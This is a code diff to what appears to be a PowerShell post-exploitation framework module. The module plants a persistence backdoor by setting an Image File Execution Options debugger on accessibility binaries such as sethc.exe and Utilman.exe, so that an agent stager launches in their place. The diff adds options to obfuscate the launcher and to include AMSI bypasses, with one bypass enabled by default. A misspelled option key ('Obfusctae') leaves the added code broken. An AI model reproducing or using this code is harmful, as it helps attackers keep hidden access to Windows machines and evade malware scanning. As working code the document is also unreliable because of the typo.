@@ -51,6 +51,26 @@ class Module(object):
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
+            },
             'TargetBinary' : {
                 'Description'   :   'Target binary to set the debugger for (sethc.exe, Utilman.exe, osk.exe, Narrator.exe, or Magnify.exe)',
                 'Required'      :   True,
@@ -84,6 +104,10 @@ class Module(object):
                 self.options[option]['Value'] = value
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
 
         # management options
         cleanup = self.options['Cleanup']['Value']        
@@ -93,6 +117,15 @@ class Module(object):
 
         # storage options
         regPath = self.options['RegPath']['Value']
+
+        # staging options
+        if (self.options['Obfusctae']['Value']).lower() == 'true':
+            Obfuscate =True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
 
         statusMsg = ""
         locationString = ""
@@ -115,7 +148,9 @@ class Module(object):
 
             else:
                 # generate the PowerShell one-liner
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell')
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', obfuscate=Obfuscate,
+                                                                   obfuscationCommand=ObfuscateCommand, AMSIBypass=AMSIBypass,
+                                                                   AMSIBypass2=AMSIBypass2)
                 
                 encScript = launcher.split(" ")[-1]
                 # statusMsg += "using listener " + listenerName
@@ -141,7 +176,5 @@ class Module(object):
             script = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '"+triggerBinary+"';'"+targetBinary+" debugger set to "+triggerBinary+"'"
         script = helpers.keyword_obfuscation(script, self.mainMenu)
         if obfuscate:
-
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
-
         return script
